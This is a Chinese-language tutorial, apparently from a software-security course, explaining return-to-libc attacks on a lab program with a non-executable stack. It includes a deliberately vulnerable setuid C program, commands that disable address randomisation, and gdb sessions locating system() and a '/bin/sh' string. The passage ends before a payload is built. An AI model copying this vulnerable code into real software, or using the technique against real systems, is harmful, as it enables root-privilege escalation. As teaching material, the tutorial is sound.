#
#### 概述
为了抵御函数返回时跳转到恶意代码在栈中的位置执行，操作系统将程序的栈标记为不可执行。因此攻击者就无法在运行注入的代码，只能想办法借助内存中已有的代码进行攻击。  

内存中有一个区域存放着很多代码，主要时标准C语言库函数。在linux中被称为libc，它是一个动态链接库。这些libc库会在函数运行前加载到内存中。  

在libc库中最容易被利用的就是system()函数，如果想要在缓冲区溢出后运行一个shell，无须自己编写shellcode，只需要跳转到system，让他来运行`/bin/sh`即可。  


#### 漏洞代码
还是和缓冲区溢出攻击中的漏洞代码一样，只是编译是打开了不可执行栈的保护
```
// stack.c
# include <string.h>
# include <stdio.h>

int foo(char *str)
{
    char buffer[100];
    strcpy(buffer, str);
    return 1;
}

int main(int argc, char const *argv[])
{
    char str[400];
    FILE *badfile;
    
    badfile = fopen("badfile", "r");
    fread(str, sizeof(char), 300, badfile);
    foo(str);

    printf("it's ok!");
    return 0;
}
```
```
sudo sysctl -w kernel.randomize_va_space=0
gcc -o stack -g -fno-stack-protector stack.c 
sudo chown root stack
sudo chmod 4755 stack
```


#### 发起攻击
为了通过system运行`/bin/sh`需要完成三个步骤  

**1.找到system函数的地址，把漏洞程序中函数的返回地址改成该地址**
```
ubuntu@VM-0-17-ubuntu:~$ gdb -q stack
Reading symbols from stack...done.
(gdb) p system
No symbol "system" in current context.
(gdb) run
Starting program: /home/ubuntu/stack 

Program received signal SIGSEGV, Segmentation fault.
0xbffff4ac in ?? ()
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7e54db0 <__libc_system>
(gdb) p exit
$2 = {<text variable, no debug info>} 0xb7e489e0 <__GI_exit>
```
在关闭了地址随机化的情况下，对同一个程序，这个函数库总是被加载到相同的内存地址。  
在gdb中需要run指令来执行目标程序，不然libc函数不会被加载到内存中。  
需要注意的是特权程序和非特权程序打印的地址可能是不一样的，所有可以先把漏洞程序改为特权程序在答应system函数地址。  


**2.找到字符串/bin/sh的地址，为了让system执行一个命令，命令的名字需要预先放在内存中。**  
有多种方式可以拿到字符串的地址。例如，可以在溢出攻击的时候，把字符串放入内存中。  
还有一种更简单的方式是通过环境变量，在运行漏洞程序之前，定义一个环境变量SHANSHELL="/bin/sh",并用export导出，该变量就会传递给子进程出现在漏洞程序内存中。
```
ubuntu@VM-0-17-ubuntu:~$ SHANSHELL="/bin/sh"
ubuntu@VM-0-17-ubuntu:~$ export SHANSHELL
ubuntu@VM-0-17-ubuntu:~$ gdb -q stack
Reading symbols from stack...done.
(gdb) b main
Breakpoint 1 at 0x80484ee: file stack.c, line 16.
(gdb) run
Starting program: /home/ubuntu/stack 

Breakpoint 1, main (argc=1, argv=0xbffff6a4) at stack.c:16
16	    badfile = fopen("badfile", "r");
(gdb) x/100s *((char **)environ)   # x/100s查看接下来的 100 个字符串
...
0xbfffffc1:	"HISTTIMEFORMAT=%F %T "
0xbfffffd7:	"SHANSHELL=/bin/sh"
0xbfffffe9:	"/home/ubuntu/stack" 
...

```
`0xbfffffe9:	"/home/ubuntu/stack"`在环境变量入栈前，程序的文件名会先被压入栈，因此程序名的长度会影响环境变量的地址


**3.system函数的参数**  
由于system并不是常规的方式被调用的,漏洞程序只是跳转到system函数的入口，因此函数所需的参数不在栈中。所以需要自行将参数放入栈中。

![](/software-security/img/return-to-libc-1.png)

首先需要知道进入system函数后ebp的确切位置。通过ebp知道了返回地址是 ebp+4， 参数是 ebp+8 ,所以需要把字符串/bin/sh的地址放到比ebp高8字节的位置。 那么system函数后ebp是多少呢？

![](/software-security/img/buffer2.png)  

在了解内存布局的时候，我们知道了，在进入一个函数帧栈的时候，会把上一个帧栈指针压入栈，然后把esp的值赋给ebp当作新的栈底。在进入system函数之前esp是指在返回地址上的，一旦程序跳转到system()中，它的函数序言将被执行，导致esp下移4个字节，并且ebp被设置成esp的当前值。
















